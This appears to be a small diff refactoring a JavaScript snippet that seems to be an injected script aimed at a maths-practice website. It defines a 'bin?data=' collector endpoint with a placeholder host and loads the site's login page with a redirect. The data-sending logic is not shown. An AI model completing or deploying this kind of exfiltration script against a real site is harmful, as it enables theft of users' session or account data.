@@ -1,4 +1,4 @@
-(function() {
+(function(w) {
   const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
   const bin = 'https://???/bin?data='
 
@@ -14,5 +14,5 @@
   }
   
   load(`/login.php?url=${encodeURIComponent(comfort)}`)
-  window.a = 1
-})()
+  w.a = 1
+})(window)
